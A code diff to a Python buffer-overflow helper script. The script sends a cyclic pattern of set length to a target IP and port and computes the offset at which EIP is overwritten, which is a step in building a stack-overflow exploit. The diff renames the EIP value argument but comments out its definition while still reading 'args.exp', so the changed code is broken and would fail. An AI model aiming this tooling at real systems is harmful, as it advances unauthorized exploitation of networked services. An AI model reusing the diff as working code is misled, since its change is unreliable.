@@ -33,15 +33,16 @@ def main():
     parser.add_argument("-ip", type=str, help="The target IP address.", required=True)
     parser.add_argument("-port", type=int, help="The target port.", required=True)
     parser.add_argument("-size", type=int, help="Buffer size to send. (default:2000)", default=2000,required=True)
-    parser.add_argument("-value", type=str, help="The value of EIP. (e.g. 386F4337 )", required=False)
+#    parser.add_argument("-exp", type=str, help="The Expression to follow. (e.g. 386F4337 )", required=False)
     args = parser.parse_args()
 
     ip = args.ip
     port = args.port
     buffer_size = args.size
-    value = args.value
     pattern = generate_pattern(buffer_size)
-    pattern_value = offset_finder(value) if value else None
+    expression = args.exp
+
+    pattern_value = offset_finder(expression) if expression else None
     print(f"[+] Generated pattern of length {buffer_size}")
 
   
@@ -54,7 +55,7 @@ def main():
         try:
             s.settimeout(10)
             response = s.recv(1024)
-            print(f"[+] Received response: {response[:100]}...")
+            print_info(f"Received response: {response[:100]}...")
         except socket.timeout:
             print_info("No response received.")
         finally:
@@ -65,8 +66,7 @@ def main():
 
         if pattern_value:
             print_success(f"Finding offset for value: {pattern_value}")
-            offset_result = offset_finder(value)
-           # print_success(f"Offset result: {offset_result}")
+            offset_result = offset_finder(expression)
             offset_value = extract_offset(offset_result)
             if offset_value is not None:
                 print_success(f"Exact offset found at: {offset_value}")
